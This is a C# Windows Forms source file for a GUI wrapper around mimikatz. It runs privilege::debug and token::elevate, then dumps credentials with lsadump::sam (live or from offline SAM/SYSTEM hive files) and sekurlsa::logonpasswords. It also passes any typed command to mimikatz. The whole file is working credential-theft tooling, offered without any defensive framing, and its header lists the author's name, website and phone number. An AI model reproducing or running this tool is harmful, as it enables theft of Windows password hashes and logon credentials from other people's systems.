using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Mimikatz
{
    /// <summary>
    /// Name     : Ebubekir Bastama (C.)
    /// Web Site : www.ebubekirbastama.com
    /// Contact  : +90 5554128854
    /// </summary>
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            //pinfo.WindowStyle = ProcessWindowStyle.Hidden;
            //pinfo.CreateNoWindow = true;
            pinfo.UseShellExecute = false;
            pinfo.RedirectStandardOutput = true;
        }
        public string debugyetkisi { get; set; } = "privilege::debug";
        public string samokuma { get; set; } = "lsadump::sam";
        public string token { get; set; } = "token::whoami";
        public string tokenelevate { get; set; } = "token::elevate";
        public string passwordall { get; set; } = "sekurlsa::logonpasswords";
        public string Yol { get; set; }
        Process proc = new Process();Thread th;
        ProcessStartInfo pinfo = new ProcessStartInfo();
        bool formTasiniyor = false; OpenFileDialog op;
        Point baslangicNoktasi = new Point(0, 0);
        void pictureBox3_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
        void panelEx2_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.Text))
                e.Effect = DragDropEffects.Copy;
            else
                e.Effect = DragDropEffects.None;
        }
        void panelEx2_MouseDown(object sender, MouseEventArgs e)
        {
            formTasiniyor = true;
            baslangicNoktasi = new System.Drawing.Point(e.X, e.Y);
        }
        void panelEx2_MouseMove(object sender, MouseEventArgs e)
        {
            if (formTasiniyor)
            {
                Point p = PointToScreen(e.Location);
                Location = new Point(p.X - this.baslangicNoktasi.X, p.Y - this.baslangicNoktasi.Y);
            }
        }
        void panelEx2_MouseUp(object sender, MouseEventArgs e)
        {
            formTasiniyor = false;
        }
        void kmtt(string cmd)
        {
            pinfo.FileName = @"cmd.exe";
            string kmtty = "/c mimikatz.exe " + debugyetkisi + " " + token + " " + tokenelevate + " "+ cmd;
            pinfo.Arguments = kmtty;
            proc.StartInfo = pinfo;
            proc.Start();
            richTextBox1.Text = "";
            String outputResult = GetStreamOutput(proc.StandardOutput);
            richTextBox1.AppendText(outputResult);

        }
        string GetStreamOutput(StreamReader stream)
        { 
            var outputReadTask = Task.Run(() => stream.ReadToEnd());

            return outputReadTask.Result;
        }
        void buttonX1_Click(object sender, EventArgs e)
        {
            th = new Thread(bsl);th.Start();
        }
        void bsl()
        {
            if (comboBox1.Text == "Sam Okuma")
            {
                kmtt(samokuma);
            }
            else if (comboBox1.Text == "Sam Okuma(Offline)")
            {
                kmtt(samokuma +" sam:"+ @"\" + Yol);
            }
            else if (comboBox1.Text == "System Okuma(Offline)")
            {
                kmtt(samokuma + " system:" + @"\" + Yol);
            }
            else if (comboBox1.Text == "Şifreleri Listele(sekurlsa)")
            {
                kmtt(passwordall);
            }
        }
        void buttonX2_Click(object sender, EventArgs e)
        {
            kmtt(textBoxX1.Text);
        }
        void pictureBox1_Click(object sender, EventArgs e)
        {
            op = new OpenFileDialog();
            if (op.ShowDialog() == DialogResult.OK)
            {
                Yol = op.FileName.ToString();
            }
        }
    }
}
